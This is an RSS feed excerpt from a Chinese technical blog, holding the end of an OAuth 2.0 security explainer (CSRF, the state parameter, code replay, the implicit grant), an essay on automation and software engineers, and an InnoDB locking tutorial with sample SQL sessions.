好消息是使用一个随机令牌就可以防范 CSRF 攻击。授权服务器渲染或者 foward 授权页面时，生成一个随机 token 保存到服务器，再将这个令牌渲染到页面并要求用户在后续的授权 API 中带上这个参数，这样就保证了每次授权都可以和一个合法的授权重定向关联起来。简而言之，通过授权服务器和客户协商一个授权口令，使后续的获取令牌的请求  可以通过该口令证明自己的身份。&lt;/p>
&lt;h3 id="针对客户端的-csrf-攻击">针对客户端的 CSRF 攻击&lt;/h3>
&lt;p>同样还有针对客户端的 CSRF 攻击。假设攻击者首先通过授权服务器进行授权获取到属于他自己的授权码，接着通过 CSRF 诱使受害者（资源拥有者）访问带有攻击者授权码的客户端回调地址的话，就会将攻击者的授权上下文和资源拥有者的客户端绑定在了一起。（即当前客户端网站的实际登陆者是真实用户，但授权码属于攻击者，这使得后续的交换 token 的流程使用了攻击者的授权码，导致授权服务器和客户端识别的用户不同，从而发放的 token，访问的资源发生错误）。
和主流的防范 CSRF 攻击的方式一样：在流程中增加使用 state （发放时授权码绑定一个唯一的回调参数）参数，即可避免这种情况的发生。&lt;/p>
&lt;h3 id="会话劫持">会话劫持&lt;/h3>
&lt;p>在大多数的 OAuth 的最佳实践中，第 5 步换取 access_token 的接口一旦接收到一个包含授权码的请求后，就会把这个授权码置为无效。为什么要这样做呢？由于 OAuth 发放授权码是通过 302 重定向来进行的，所以在公共计算机上，任何人使用过的授权码重定向都会留存在历史记录中。如果攻击者在客户端上用他自己的身份凭据登录，然后找出之前的授权码进行重定向，这样攻击者就可以使用上一个资源拥有者的资源。&lt;/p>
&lt;h2 id="隐式许可类型流程">隐式许可类型流程&lt;/h2>
&lt;p>相较于授权码许可类型，还有一种常见的许可类型称为隐式许可类型。这种许可类型没有客户端，或者说用户就充当了客户端——比如用户直接访问授权服务器进行认证并授权，授权服务器在授权端点会直接生成一个令牌并返回到浏览器。
&lt;img src="https://raw.githubusercontent.com/mikumikulch/pictures/master/2020-11-24-16-50-10.jpg" alt="">
隐式许可类型一般适合于完全运行于浏览器 js 内的应用或者原生开发的 app 等场景上。另外由于隐式许可类型的设计初衷就是针对用户一直在场的场景，所以它无法使用刷新令牌。&lt;/p>
&lt;h2 id="小结">小结&lt;/h2>
&lt;p>OAuth 是用来解决用户对软件授权而开发出来的标准化协议，尽管它的功能不止如此。OAuth 2.0 有多种协议类型，其中常用的叫做「授权码许可类型」和「隐式许可类型」。授权码许可类型虽然很常用、很标准，但不适用于浏览器以外的场景。
隐式许可类型虽然安全性不如授权码许可类型，但胜在简单高效。在原生 APP 与单点登录系统中应用广泛。最后，和其他的软件程序一样，构建一个支持 OAuth 2 协议的工程并不难。难的是如何使其健壮、安全、易用。&lt;/p></description></item><item><title>软件工程师的消失</title><link>https://www.chucklin.net/post/disappear/</link><pubDate>Sun, 01 Mar 2020 09:52:00 +0800</pubDate><guid>https://www.chucklin.net/post/disappear/</guid><description>&lt;h2 id="生产力大发展">生产力大发展&lt;/h2>
&lt;p>在现代互联网，完善的基础建设和丰富的自动化工具，极大的缩短和降低了软件开发的周期与成本，现在一个小型的 web 应用的研发计划可能仅需要 5 天。&lt;/p>
&lt;ol>
&lt;li>将想法通过原型图工具落实为原型图。1 人/日&lt;/li>
&lt;li>设计表结构并使用插件自动生成后端接口。1 人/日&lt;/li>
&lt;li>原型图工具自动生成前端页面。1 人/日&lt;/li>
&lt;li>自动生成测试用例，完成测试。1 人/日&lt;/li>
&lt;li>将应用代码打包部署到云服务。1 人/日&lt;/li>
&lt;/ol>
&lt;p>而在以前，上述工作至少需要设计、开发、产品、运维这些角色共同承担，同时还得购买昂贵的服务器设备。&lt;/p>
&lt;p>好吧。5 天开发并上线一个应用，也许这就是极限了？显然不是。即使是非专业的开发人员，通过使用智能研发套件 2 天就可以开发一个应用。&lt;/p>
&lt;ol>
&lt;li>根据需求一次性完成产品设计与代码生成并自动化部署。1 人/日&lt;/li>
&lt;li>适当配置与测试，开始使用。1 人/日&lt;/li>
&lt;/ol>
&lt;p>而当你阅读文章的时候，互联网技术正在突飞猛进，生产力还在持续提高。&lt;/p>
&lt;h2 id="软件工程师的消失">软件工程师的消失&lt;/h2>
&lt;p>制造本身就是一个可以被自动化的过程。试着把代码想象成汽车零件。结构单一的零件(代码)在流水线上被拼装成为模块(微服务)，模块再经过组装成为汽车成品(应用)。越是自动化程度高的流水线，其成本越低，质量越好，效率越高。&lt;/p>
&lt;p>对于大部分互联网从业人员来说，未来甚至是不久的将来，开发一个应用可能大概和烤一块儿吐司的流程差不多：放入面包，按下按钮然后稍等片刻。&lt;/p>
&lt;p>&lt;img src="https://cdn.sspai.com/2020/02/23/e3ee62c961a63561291ed80c1f7b8fa7.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1" alt="toast">&lt;/p>
&lt;p>生产力的提升使得互联网从业人员的角色变得模糊，未来专职的应用层软件开发人员将会逐渐退出历史舞台，无论你是前端还是后端，大家都一样。但是软件开发这件事情并不会消失。就像曾经的打字员一样，计算机的普及使得专职的打字员消失了，「打字」和说话一样成为了一种理所当然的能力。&lt;/p>
&lt;h2 id="工程师思维">工程师思维&lt;/h2>
&lt;p>虽然应用层软件工程师的没落不可避免，但是没必要沮丧。从事编程的经验培养了你的工程师思维：「发觉出问题根源并加以解决的能力」，这是具备普遍适用性的无价之宝。&lt;/p>
&lt;p>设想你接到一个需求后会怎么做？首先理解需求；接着在需求评审会上和产品经理与其他工程师沟通，作出设计给出排期计划；当一切都确定后才开始编写代码。看到了吗？制造排在最后一步。&lt;/p>
&lt;p>另外软件开发类书籍看似教授的是如何编程，实际上传达的是设计的哲学。这些知识将帮助读者建立正确的思维方式，培养发掘问题根源的敏锐嗅觉。&lt;/p>
&lt;p>你是否有过这种体验？你是一名资深工程师，受邀加入一个问题百出的团队并被要求显著提升产品质量。经过一段时间的共事后，你发现团队最大的问题是人。混乱的思维方式产生糟糕的设计造就漏洞百出的产品。如果不对问题的根源加以解决，结果就是搞定的问题越多产生的问题更多。&lt;/p>
&lt;h2 id="最后">最后&lt;/h2>
&lt;p>工程师思维是技术和艺术的结合。但技术天生的标准化与自动化属性会让艺术所占的比重越来越大。未来也许就像《死亡搁浅》中基于开罗尔粒子的 3D 打印技术一样，你只需要提供创意和设计，剩下的交给全自动化的基础设施去实现。&lt;/p>
&lt;p>未来是更加多元化的社会。像「销售」、「行政」、「会计」、「翻译」、「管理」这些单一的词汇不再适用于定义一个人的职业。这些标签会进入历史的长河而新的称谓会被创造出来。也许将来有一天，再次看到这些旧称时可能会感觉像「打字员」一样亲切和复古吧。&lt;/p></description></item><item><title>认识数据库锁</title><link>https://www.chucklin.net/post/lockinmysql/</link><pubDate>Tue, 25 Feb 2020 09:52:00 +0800</pubDate><guid>https://www.chucklin.net/post/lockinmysql/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>针对不同的存储引擎的数据库锁的实现是不相同的，而现代大型项目基本都选择了 innoDB 作为存储引擎，所以本章节只探讨 innoDB 数据库锁的内容。&lt;/p>
&lt;p>innoDB 的数据库锁与事务特性息息相关。所以在探讨开始之前，先来回顾一下 innoDB 的事务特性，会有助于理解后续的内容。&lt;/p>
&lt;h4 id="事务的挑战与-acid-属性">事务的挑战与 ACID 属性&lt;/h4>
&lt;p>事务是  构建健壮系统不可获取的条件之一。构建一个完善的事务至少要面临以下挑战。&lt;/p>
&lt;ul>
&lt;li>更新丢失：两个并行操作，后进行的操作覆盖掉了先进行操作的操作结果，被称作更新丢失。&lt;/li>
&lt;li>脏读：一个事务在提交之前，在事务过程中修改的数据，被其他事务读取到了。&lt;/li>
&lt;li>不可重复读：一个事务在提交之前，在事务过程中读取以前的数据却发现数据发生了改变。&lt;/li>
&lt;li>幻读：一个事务按照相同的条件重新读取以前检索过的数据时，却发现了其他事务插入的新数据。&lt;/li>
&lt;/ul>
&lt;p>对于上述挑战，除了更新丢失应该通过应用程序完全避免以外，其他都可以通过数据库的隔离等级提供的事务 ACID 特性保证得到解决。&lt;/p>
&lt;ul>
&lt;li>原子性&lt;/li>
&lt;li>一致性&lt;/li>
&lt;li>隔离性&lt;/li>
&lt;li>持久性&lt;/li>
&lt;/ul>
&lt;p>提供 ACID 特性保证的手段有两种，一种是 MVCC 多版本控制系统，还有一种就是利用锁。&lt;/p>
&lt;h2 id="数据库中的锁">数据库中的锁&lt;/h2>
&lt;p>数据库的锁按照类型可划分为共享锁与排他锁。&lt;/p>
&lt;ul>
&lt;li>共享锁：允许一个事务读取一行，阻止其他事务获得相同数据集的排他锁。但允许其他事务获取共享锁。&lt;/li>
&lt;li>排他锁：允许获得排他锁的事务更新数据，阻止其他事务取得相同数据集的共享与排他锁。但是可以对获取了排他锁的数据集进行单纯的查询访问。&lt;/li>
&lt;/ul>
&lt;p>在「可重复读」的隔离等级下，对于普通的 select 语句，InnoDB 默认使用 MVCC 来提供可重复度隔离等级的事务特性保证。
对于非普通的 select 语句，如：Update、Delete、insert、select for update/share 等，，InnoDB 会自动给涉及的数据集加上排他锁或共享锁。&lt;/p>
&lt;h3 id="死锁">死锁&lt;/h3>
&lt;p>假设你足够细心，可能已经察觉到死锁的隐患了。多个线程持有某个数据集的共享锁，再尝试获取排他锁时会发生什么情况？&lt;/p>
&lt;p>&lt;strong>session 1 -&amp;gt; 针对 age = 26 的记录加共享锁&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">CREATE&lt;/span> &lt;span style="color:#66d9ef">TABLE&lt;/span> &lt;span style="color:#f92672">`&lt;/span>test_index_table&lt;span style="color:#f92672">`&lt;/span> (
&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">NOT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span> AUTO_INCREMENT,
&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>birthday&lt;span style="color:#f92672">`&lt;/span> datetime &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>phone&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>note&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#66d9ef">PRIMARY&lt;/span> &lt;span style="color:#66d9ef">KEY&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span>),
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>NAME_ADDRESS&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span>,&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE,
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>AGE&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE
) ENGINE&lt;span style="color:#f92672">=&lt;/span>InnoDB AUTO_INCREMENT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">283&lt;/span> &lt;span style="color:#66d9ef">DEFAULT&lt;/span> CHARSET&lt;span style="color:#f92672">=&lt;/span>utf8
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> test_index_table &lt;span style="color:#66d9ef">where&lt;/span> age &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">26&lt;/span> &lt;span style="color:#66d9ef">lock&lt;/span> &lt;span style="color:#66d9ef">in&lt;/span> &lt;span style="color:#66d9ef">share&lt;/span> &lt;span style="color:#66d9ef">mode&lt;/span>;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/563oeetth50hj2fhbtc60f49/image_1bjc51gaf1douqq81uqgg2h3fi2n.png" alt="image_1bjc51gaf1douqq81uqgg2h3fi2n.png-100.6kB">&lt;/p>
&lt;p>&lt;strong>session 2 -&amp;gt; 针对 age = 26 的记录加共享锁&lt;/strong>
&lt;img src="http://static.zybuluo.com/mikumikulch/1afl0b7mgm5fnt2pcdnsybuz/image_1bjc54stv177b1jg41i72171mo7534.png" alt="image_1bjc54stv177b1jg41i72171mo7534.png-95.3kB">&lt;/p>
&lt;p>&lt;strong>session 1 -&amp;gt; 针对 age = 26 的记录获取排他锁&lt;/strong>&lt;/p>
&lt;p>由于当前数据集已经被 session 2 获取到了共享锁，无法再获取排他锁，操作阻塞。（道理很简单，文件被读取的时候不允许写入）
&lt;img src="http://static.zybuluo.com/mikumikulch/3j7oxesz3e932mvtjt8irav9/image_1bjc56gu81pji1c1a1cuv1elmtgt3h.png" alt="image_1bjc56gu81pji1c1a1cuv1elmtgt3h.png-25.9kB">&lt;/p>
&lt;p>&lt;strong>session 2 -&amp;gt; 针对 age = 26 的记录获取排他锁&lt;/strong>
由于当前数据集已经被 session 1 获取了共享锁，无法再获取排他锁，造成循环等待，数据库死锁操作退出。
&lt;img src="http://static.zybuluo.com/mikumikulch/er7heh4d03hqmxac39b3pkk6/image_1bjc575bc1u001u2hormh858c33u.png" alt="image_1bjc575bc1u001u2hormh858c33u.png-134.5kB">&lt;/p>
&lt;p>可见，两个 session 获得同一个数据集的共享锁，再分别尝试获取排他锁时会造成循环依赖，就会引起数据库死锁报错，操作退出。&lt;/p>
&lt;h2 id="行锁与索引">行锁与索引&lt;/h2>
&lt;p>光理解锁的基本概念是远远不够的。在 InnoDB 中，行锁是通过给索引上的索引项加锁来实现的。如果没有索引，InnoDB 就会对整张表加锁。另外，根据针对 sql 语句检索条件的不同，加锁又有以下三种情形需要我们掌握。&lt;/p>
&lt;ul>
&lt;li>Record lock：对索引项加锁。&lt;/li>
&lt;li>Gap lock：对索引项之间的间隙加锁。&lt;/li>
&lt;li>Next-key lock：对当前记录和记录前面的间隙加锁。&lt;/li>
&lt;/ul>
&lt;h3 id="record-lock对索引项加锁若没有索引项则使用表锁">Record lock：对索引项加锁。若没有索引项则使用表锁。&lt;/h3>
&lt;p>InnoDB 针对索引进行加锁的实现方式意味着：只有通过索引条件检索或者更新数据，InnoDB 才使用行级锁，否则 InnoDB 将会使用表锁更新数据，极大地降低数据库的并发执行性能。&lt;/p>
&lt;p>&lt;strong>session 1 -&amp;gt; 尝试对非索引件进行检索或者 update 获取排他锁。&lt;/strong>
现有一张拥有 NAME_ADDRESS 的复合索引与主键索引的数据表。请注意，AGE 索引已经被我删除了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">CREATE&lt;/span> &lt;span style="color:#66d9ef">TABLE&lt;/span> &lt;span style="color:#f92672">`&lt;/span>test_index_table&lt;span style="color:#f92672">`&lt;/span> (
&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">NOT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span> AUTO_INCREMENT,
&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>birthday&lt;span style="color:#f92672">`&lt;/span> datetime &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>phone&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>note&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#66d9ef">PRIMARY&lt;/span> &lt;span style="color:#66d9ef">KEY&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span>),
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>NAME_ADDRESS&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span>,&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE
) ENGINE&lt;span style="color:#f92672">=&lt;/span>InnoDB AUTO_INCREMENT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">283&lt;/span> &lt;span style="color:#66d9ef">DEFAULT&lt;/span> CHARSET&lt;span style="color:#f92672">=&lt;/span>utf8
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/h24ba6g86xl0kfbrzd3sh5xc/image_1bjc6kdko8ab31465117k510fc4b.png" alt="image_1bjc6kdko8ab31465117k510fc4b.png-150.2kB">&lt;/p>
&lt;p>尝试对这张表进行非索引项的 Modify 语句。回想之前的概念：modify 语句会自动给当前数据集加上排他锁。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">update&lt;/span> test_schema.test_index_table &lt;span style="color:#66d9ef">set&lt;/span> name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;王二&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">where&lt;/span> age &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">26&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/crz1zsnmn5z4z9o2w5dkj0eo/image_1bjc72brk1q6f8emjg01kts1fla4o.png" alt="image_1bjc72brk1q6f8emjg01kts1fla4o.png-55.1kB">&lt;/p>
&lt;p>&lt;strong>session2 -&amp;gt; 尝试对 age 为 27 的记录进行更新。&lt;/strong>
由于 age 字段为非索引字段，所以 session1 使用了表锁而非行锁来确保数据库并发访问的一致性。造成了 session 2 的更新操作阻塞。
&lt;img src="http://static.zybuluo.com/mikumikulch/uiycr0yv0hcmzvyms2qj7xug/image_1bjc8m5pl140tb8tu0rk3g15so55.png" alt="image_1bjc8m5pl140tb8tu0rk3g15so55.png-18kB">&lt;/p>
&lt;p>&lt;strong>session1 -&amp;gt; 释放 session1 的表锁。&lt;/strong>
&lt;img src="http://static.zybuluo.com/mikumikulch/ch16dmclf6ebl1di5y6gheup/image_1bjc8p7431rf41ln915fu8i3ujr5i.png" alt="image_1bjc8p7431rf41ln915fu8i3ujr5i.png-61.7kB">&lt;/p>
&lt;p>&lt;strong>session2 -&amp;gt; 更新操作执行成功。&lt;/strong>
&lt;img src="http://static.zybuluo.com/mikumikulch/p9d8c0o4sisxfn6qoufjbfou/image_1bjc8pv00vna1ud0r0nhns1j3i5v.png" alt="image_1bjc8pv00vna1ud0r0nhns1j3i5v.png-40.6kB">&lt;/p>
&lt;h3 id="针对索引加锁而不是针对记录加锁">针对索引加锁，而不是针对记录加锁&lt;/h3>
&lt;p>刚才已经提到 innoDB 的行锁的实现方式是基于索引项的。这意味着即使你尝试获取不同行的排他锁，若使用了相同的索引键，也可能会造成锁冲突。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">CREATE&lt;/span> &lt;span style="color:#66d9ef">TABLE&lt;/span> &lt;span style="color:#f92672">`&lt;/span>test_index_table&lt;span style="color:#f92672">`&lt;/span> (
&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">NOT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span> AUTO_INCREMENT,
&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>birthday&lt;span style="color:#f92672">`&lt;/span> datetime &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>phone&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>note&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#66d9ef">PRIMARY&lt;/span> &lt;span style="color:#66d9ef">KEY&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span>),
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>NAME_ADDRESS&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span>,&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE,
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>AGE&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE
) ENGINE&lt;span style="color:#f92672">=&lt;/span>InnoDB AUTO_INCREMENT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">283&lt;/span> &lt;span style="color:#66d9ef">DEFAULT&lt;/span> CHARSET&lt;span style="color:#f92672">=&lt;/span>utf8
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/qigl3diwm8rsq2wjgx4ek31z/image_1bjcac76j1fen1ep2bq46lj1fip7j.png" alt="image_1bjcac76j1fen1ep2bq46lj1fip7j.png-146.1kB">&lt;/p>
&lt;p>&lt;strong>session1 -&amp;gt; 针对 age = 29 and address = 东京 获取排他锁。&lt;/strong>
通过观察表很容易得出本次我们期望获取排他锁的数据集应该是 id = 150 的记录。
&lt;img src="http://static.zybuluo.com/mikumikulch/9sfqnnodmv3c46ql56d7773c/image_1bjcakqph1ma917icjmtv42pvr80.png" alt="image_1bjcakqph1ma917icjmtv42pvr80.png-51.7kB">&lt;/p>
&lt;p>&lt;strong>session1 -&amp;gt; 针对 age = 29 and address = 北京 获取排他锁。&lt;/strong>
尝试更新 id = 149 记录的操作竟然阻塞了。
&lt;img src="http://static.zybuluo.com/mikumikulch/k3kk1o189szaj65f7jolj6i6/image_1bjcamhi417f8q44b19j2u1lnn8d.png" alt="image_1bjcamhi417f8q44b19j2u1lnn8d.png-31.8kB">&lt;/p>
&lt;p>更新不同行的数据集，却产生了排他锁阻塞的原因其实很简单。由于 mysql 的行锁的实现方式基于索引，所以 149 与 150 对应到的二级索引项实际是同一个。所以 session2 在尝试获取排他锁时操作被 session1 阻塞。&lt;/p>
&lt;h3 id="next-key-锁">next-key 锁&lt;/h3>
&lt;p>当利用范围条件而不是相等条件获取排他锁时，innoDB 会给符合条件的所有数据加锁。对于在条件范围内但是不存在的记录，叫做间隙。innoDB 也会对这个间隙进行加锁。另外，使用相等的检索条件时，若指定了本身不存在的记录作为检索条件的值的话，则此值对应的索引项也会加锁。&lt;/p>
&lt;p>&lt;strong>session 1 -&amp;gt; age &amp;gt;= 25 的索引项获取排他锁&lt;/strong>
&lt;img src="http://static.zybuluo.com/mikumikulch/j6525nuyfmjhh446sm6jks9j/image_1bjcbkjc0hvp4j4km5stkj4a8q.png" alt="image_1bjcbkjc0hvp4j4km5stkj4a8q.png-44.8kB">&lt;/p>
&lt;p>&lt;strong>session 2 -&amp;gt; age = 39 的索引项获取排他锁&lt;/strong>
由于 session1 的操作产生了 next-key 锁的原因操作被阻塞
&lt;img src="http://static.zybuluo.com/mikumikulch/nbzrw53sehnotmu4jw5pihgs/image_1bjcbqhmr1di61iqk121ts151eee97.png" alt="image_1bjcbqhmr1di61iqk121ts151eee97.png-17.3kB">&lt;/p>
&lt;p>&lt;strong>session 1 -&amp;gt; 释放锁。&lt;/strong>
&lt;img src="http://static.zybuluo.com/mikumikulch/2upu8iqks58y7jedth4fu7mp/image_1bjcbtjmh1k7s1kr61sqhcr31bv89k.png" alt="image_1bjcbtjmh1k7s1kr61sqhcr31bv89k.png-15.3kB">&lt;/p>
&lt;p>&lt;strong>session 2 -&amp;gt; 操作执行成功。同时给 age = 39 的索引项增加了 next-key 锁。&lt;/strong>
&lt;img src="http://static.zybuluo.com/mikumikulch/161c2ahs6rotd3yagipybyb4/image_1bjcbud3c1ffnnuh11ghmt9vea1.png" alt="image_1bjcbud3c1ffnnuh11ghmt9vea1.png-41.7kB">&lt;/p>
&lt;p>&lt;strong>session 1 -&amp;gt; 尝试更新 age = 39 的索引项对应的记录。&lt;/strong>
由于上一步 session 2 的 next-key 锁的原因，本次操作被阻塞。
&lt;img src="http://static.zybuluo.com/mikumikulch/jog28f29lmkp1vo8ax3xubtv/image_1bjcc082u1nh1ur91bkl82mm9ae.png" alt="image_1bjcc082u1nh1ur91bkl82mm9ae.png-16.9kB">&lt;/p>
&lt;p>可见，凡是会引起 next-key 锁的操作都需要慎重考虑。稍不留意就会大幅度降低数据库的并发操作性能。也许你会觉得 next-key 锁的实现是不是欠妥。但是，mysql innoDB 实现 next-key 锁的一个重要原因就是为了防止事务的幻读。
当存在 next-key 的情况下，执行中的事务无论外部插入多少数据也不会在事务提交之前读到新插入的数据集，从而保证了事务的一致性。&lt;/p>
&lt;h2 id="检查-innodb-行锁争用的情况">检查 InnoDB 行锁争用的情况&lt;/h2>
&lt;h4 id="检查-innodb_row_lock-状态变量分析系统上的行锁竞争情况">检查 InnoDB_row_lock 状态变量分析系统上的行锁竞争情况&lt;/h4>
